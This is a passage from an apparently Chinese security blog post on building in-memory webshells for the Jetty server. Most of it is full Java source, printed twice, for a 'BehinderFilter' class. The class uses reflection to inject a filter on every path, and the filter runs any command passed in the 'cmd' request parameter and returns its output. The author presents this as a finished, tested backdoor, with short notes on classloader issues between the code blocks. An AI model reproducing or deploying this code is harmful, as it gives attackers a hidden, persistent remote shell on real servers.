class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">Object</span> <span class="variable">servletHandler</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> <span class="string">&quot;BehinderFilter&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">filterClassName</span> <span class="operator">=</span> <span class="string">&quot;MemshellTest.BehinderFilter&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;/*&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object obj, String name)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> obj.getClass();</span><br><span class="line">        <span class="keyword">while</span>(clazz != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                field = clazz.getDeclaredField(name);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException var6) &#123;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Method <span class="title function_">getMethod</span><span class="params">(Object obj, String name, Class&lt;?&gt;... paramClazz)</span> <span class="keyword">throws</span> NoSuchMethodException &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> obj.getClass();</span><br><span class="line">        <span class="keyword">while</span>(clazz != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                method = clazz.getDeclaredMethod(name, paramClazz);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var6) &#123;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> method;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">getHandler</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">thread</span> <span class="operator">=</span> Thread.currentThread();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> getFieldValue(thread, <span class="string">&quot;contextClassLoader&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">context</span> <span class="operator">=</span> getFieldValue(contextClassLoader,<span class="string">&quot;_context&quot;</span>);</span><br><span class="line">        servletHandler = getFieldValue(context, <span class="string">&quot;_servletHandler&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//获取ServletHandler</span></span><br><span class="line">            getHandler();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//获取FilterHolder</span></span><br><span class="line">            <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BehinderFilter</span>();</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor2</span> <span class="operator">=</span> servletHandler.getClass().getClassLoader().loadClass(<span class="string">&quot;org.eclipse.jetty.servlet.FilterHolder&quot;</span>).getDeclaredConstructor();</span><br><span class="line">            constructor2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">filterHolder</span> <span class="operator">=</span> constructor2.newInstance();</span><br><span class="line"></span><br><span class="line">            <span class="type">Method</span> <span class="variable">setFilter</span> <span class="operator">=</span> filterHolder.getClass().getDeclaredMethod(<span class="string">&quot;setFilter&quot;</span>,Filter.class);</span><br><span class="line">            setFilter.invoke(filterHolder,filter);</span><br><span class="line"></span><br><span class="line">            <span class="type">Method</span> <span class="variable">setName</span> <span class="operator">=</span> filterHolder.getClass().getSuperclass().getDeclaredMethod(<span class="string">&quot;setName&quot;</span>,String.class);</span><br><span class="line">            setName.invoke(filterHolder,filterName);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//拼凑filtermapping</span></span><br><span class="line"></span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> servletHandler.getClass().getClassLoader().loadClass(<span class="string">&quot;org.eclipse.jetty.servlet.FilterMapping&quot;</span>).getDeclaredConstructor();</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">filterMapping</span> <span class="operator">=</span> constructor.newInstance();</span><br><span class="line"></span><br><span class="line">            <span class="type">Method</span> <span class="variable">setFilterName</span> <span class="operator">=</span> filterMapping.getClass().getDeclaredMethod(<span class="string">&quot;setFilterName&quot;</span>,String.class);</span><br><span class="line">            setFilterName.invoke(filterMapping,filterName);</span><br><span class="line"></span><br><span class="line">            <span class="type">Method</span> <span class="variable">setFilterHolder</span> <span class="operator">=</span> filterMapping.getClass().getDeclaredMethod(<span class="string">&quot;setFilterHolder&quot;</span>,filterHolder.getClass());</span><br><span class="line">            setFilterHolder.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            setFilterHolder.invoke(filterMapping,filterHolder);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">pathSpecs</span> <span class="operator">=</span> url;</span><br><span class="line"></span><br><span class="line">            <span class="type">Method</span> <span class="variable">setPathSpec</span> <span class="operator">=</span> filterMapping.getClass().getDeclaredMethod(<span class="string">&quot;setPathSpec&quot;</span>,String.class);</span><br><span class="line">            setPathSpec.invoke(filterMapping,pathSpecs);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//加入filterPathMappings</span></span><br><span class="line">            <span class="type">ArrayList</span> <span class="variable">_filterPathMapings</span> <span class="operator">=</span> (ArrayList) getFieldValue(servletHandler,<span class="string">&quot;_filterPathMappings&quot;</span>);</span><br><span class="line">            _filterPathMapings.add(filterMapping);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">        <span class="comment">//回显处理</span></span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">        java.io.<span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(inputStream));</span><br><span class="line">        String line;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">stringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>)&#123;</span><br><span class="line">            stringBuilder.append(line + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ServletOutputStream</span> <span class="variable">servletOutputStream</span> <span class="operator">=</span> response.getOutputStream();</span><br><span class="line">        servletOutputStream.write(stringBuilder.toString().getBytes());</span><br><span class="line">        servletOutputStream.flush();</span><br><span class="line">        servletOutputStream.close();</span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>无论是从环境的角度考虑，还是从结果的payload当中来看问题的答案都倾向于第二种说法，因为在payload当中使用应用类加载器加载出的类用于初始化是没有任何问题的，能够和之前的在源码当中的对象进行相互转化。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">servletHandler.getClass().getClassLoader().loadClass(<span class="string">&quot;org.eclipse.jetty.servlet.FilterMapping&quot;</span>).getDeclaredConstructor();</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">filterMapping</span> <span class="operator">=</span> constructor.newInstance();</span><br></pre></td></tr></table></figure>
<p>原因就是在程序运行的时候，有另外的加载器也加载了这个类，然后我们在使用new去声明该类的的时候调用了该类加载器加载的类从而造成了命名空间的不同。</p>
<h5 id="额外的问题">额外的问题</h5>
<p>我们可不可以使用反射获取filtermapping然后其他的部分（filterholder）使用new的方式获取实例化对象？答案也是不行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//反射方式</span><br><span class="line">Constructor constructor2 = servletHandler.getClass().getClassLoader().loadClass(&quot;org.eclipse.jetty.servlet.FilterHolder&quot;).getDeclaredConstructor();</span><br><span class="line">constructor2.setAccessible(true);</span><br><span class="line">Object filterHolder = constructor2.newInstance();</span><br><span class="line">//new方式</span><br><span class="line">FilterHolder filterHolder = new FilterHolder();</span><br></pre></td></tr></table></figure>
<p>在我个人的尝试过程中，结果是不行的，它会在后续的为filtermapping反射获取方法的时候受到限制</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">setFilterHolder</span> <span class="operator">=</span> filterMapping.getClass().getDeclaredMethod(<span class="string">&quot;setFilterHolder&quot;</span>,filterHolder.getClass());</span><br></pre></td></tr></table></figure>
<p>如果我们使用的是反射方式，在这一步当中，它会提示我们找不到对应的方法，而在源码当中确实存在入参为该类的方法。我们可以分别在该处打下断点，然后用evaluate去计算这两种情况下的filterHolder.getClass()的值。</p>
<p>//new实例化方式</p>
<img data-src="/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/26.png" class>
<p>//反射方式</p>
<img data-src="/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/27.png" class>
<p>这两个结果只有一个不同，就是使用反射获取构造器实例化的对象当中在reflectionData当中是有值的。</p>
<h4 id="最终filter内存马">最终Filter内存马</h4>
<p>所以结合这些问题的分析与解决我们最后得到一个测试成功的内存马</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> MemshellTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.eclipse.jetty.servlet.FilterHolder;</span><br><span class="line"><span class="keyword">import</span> org.eclipse.jetty.servlet.FilterMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BehinderFilter</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">Object</span> <span class="variable">servletHandler</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> <span class="string">&quot;BehinderFilter&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">filterClassName</span> <span class="operator">=</span> <span class="string">&quot;MemshellTest.BehinderFilter&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;/*&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object obj, String name)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> obj.getClass();</span><br><span class="line">        <span class="keyword">while</span>(clazz != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                field = clazz.getDeclaredField(name);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException var6) &#123;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Method <span class="title function_">getMethod</span><span class="params">(Object obj, String name, Class&lt;?&gt;... paramClazz)</span> <span class="keyword">throws</span> NoSuchMethodException &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> obj.getClass();</span><br><span class="line">        <span class="keyword">while</span>(clazz != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                method = clazz.getDeclaredMethod(name, paramClazz);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var6) &#123;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> method;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">getHandler</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">thread</span> <span class="operator">=</span> Thread.currentThread();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> getFieldValue(thread, <span class="string">&quot;contextClassLoader&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">context</span> <span class="operator">=</span> getFieldValue(contextClassLoader,<span class="string">&quot;_context&quot;</span>);</span><br><span class="line">        servletHandler = getFieldValue(context, <span class="string">&quot;_servletHandler&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//获取ServletHandler</span></span><br><span class="line">            getHandler();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//获取FilterHolder</span></span><br><span class="line">            <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BehinderFilter</span>();</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor2</span> <span class="operator">=</span> servletHandler.getClass().getClassLoader().loadClass(<span class="string">&quot;org.eclipse.jetty.servlet.FilterHolder&quot;</span>).getDeclaredConstructor();</span><br><span class="line">            constructor2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">filterHolder</span> <span class="operator">=</span> constructor2.newInstance();</span><br><span class="line"></span><br><span class="line">            <span class="type">Method</span> <span class="variable">setFilter</span> <span class="operator">=</span> filterHolder.getClass().getDeclaredMethod(<span class="string">&quot;setFilter&quot;</span>,Filter.class);</span><br><span class="line">            setFilter.invoke(filterHolder,filter);</span><br><span class="line"></span><br><span class="line">            <span class="type">Method</span> <span class="variable">setName</span> <span class="operator">=</span> filterHolder.getClass().getSuperclass().getDeclaredMethod(<span class="string">&quot;setName&quot;</span>,String.class);</span><br><span class="line">            setName.invoke(filterHolder,filterName);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//拼凑filtermapping</span></span><br><span class="line"></span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> servletHandler.getClass().getClassLoader().loadClass(<span class="string">&quot;org.eclipse.jetty.servlet.FilterMapping&quot;</span>).getDeclaredConstructor();</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">filterMapping</span> <span class="operator">=</span> constructor.newInstance();</span><br><span class="line"></span><br><span class="line">            <span class="type">Method</span> <span class="variable">setFilterName</span> <span class="operator">=</span> filterMapping.getClass().getDeclaredMethod(<span class="string">&quot;setFilterName&quot;</span>,String.class);</span><br><span class="line">            setFilterName.invoke(filterMapping,filterName);</span><br><span class="line"></span><br><span class="line">            <span class="type">Method</span> <span class="variable">setFilterHolder</span> <span class="operator">=</span> filterMapping.getClass().getDeclaredMethod(<span class="string">&quot;setFilterHolder&quot;</span>,filterHolder.getClass());</span><br><span class="line">            setFilterHolder.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            setFilterHolder.invoke(filterMapping,filterHolder);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">pathSpecs</span> <span class="operator">=</span> url;</span><br><span class="line"></span><br><span class="line">            <span class="type">Method</span> <span class="variable">setPathSpec</span> <span class="operator">=</span> filterMapping.getClass().getDeclaredMethod(<span class="string">&quot;setPathSpec&quot;</span>,String.class);</span><br><span class="line">            setPathSpec.invoke(filterMapping,pathSpecs);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//加入filterPathMappings</span></span><br><span class="line">            <span class="type">ArrayList</span> <span class="variable">_filterPathMapings</span> <span class="operator">=</span> (ArrayList) getFieldValue(servletHandler,<span class="string">&quot;_filterPathMappings&quot;</span>);</span><br><span class="line">            _filterPathMapings.add(filterMapping);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">        <span class="comment">//回显处理</span></span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">        java.io.<span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(inputStream));</span><br><span class="line">        String line;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">stringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>)&#123;</span><br><span class="line">            stringBuilder.append(line + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ServletOutputStream</span> <span class="variable">servletOutputStream</span> <span class="operator">=</span> response.getOutputStream();</span><br><span class="line">        servletOutputStream.write(stringBuilder.toString().getBytes());</span><br><span class="line">        servletOutputStream.flush();</span><br><span class="line">        servletOutputStream.close();</span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="serlevt内存马分析构造">Serlevt内存马分析构造</h4>
<p>在filter内存马的实现当中，我们发现在ServletHandler对象里面存在了很多有用的变量其中就包含了
<code>_filterPathMapings</code>他可以帮我们实现filter内存马，更进一步的，有没有别的变量可以帮助我们实现servlet内存马呢？从变量池里面我们看到了<code>_servlets</code>以及<code>_servletsMapping</code></p>
<img data-src="/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/28.png" class>
<p>在ServletHandler类当中可以检索通过哪个函数为<code>_servlets</code>进行赋值，然后再定位调用赋值函数的位置。最终能找到addServlet函数对<code>_servlets</code>进行赋值且变量类型为ServletHolder</p>
<img data-src="/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/29.jpg" class>
<img data-src="/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/30.jpg" class>
<p>然而ServletHolder当中的内容和FilterHolder的内容差不多，可以直接把FilterHolder进行实例化的部分照抄过来，得到如下所示的代码段。</p>
<img data-src="/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/31.png" class>
